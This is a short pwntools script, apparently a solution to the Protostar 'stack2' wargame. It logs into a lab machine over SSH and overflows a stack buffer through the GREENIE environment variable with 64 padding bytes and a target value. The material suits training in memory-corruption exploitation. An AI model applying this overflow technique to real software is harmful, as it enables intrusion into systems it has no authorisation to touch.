from pwn import *

s = ssh(host='192.168.56.102', user='user', password='user')


proc = s.run('/opt/protostar/bin/stack2', env={'GREENIE':'\x41'*64 + p32(0x0d0a0d0a)})

print proc.recv(1024)
